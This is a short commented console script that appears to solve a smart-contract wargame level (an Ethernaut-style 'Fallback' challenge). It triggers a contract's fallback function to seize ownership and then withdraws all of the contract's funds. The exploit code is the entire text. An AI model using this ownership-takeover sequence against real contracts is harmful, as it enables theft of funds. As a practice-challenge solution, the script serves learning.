//confirm current balance
await getBalance(contract.address)

//contribute something so our address's balance is greater than 0 
await contract.contribute({value: toWei(0.0001)})

//send ether directly to the contract to execute fallback function and become owner 
await contract.sendTransaction({from: player,value: toWei("0.0001")})

//confirm ownership
await contract.owner() == player

//drain all funds from contract
await contract.withdraw()

//confirm balance of contract is now 0 
await getBalance(contract.address)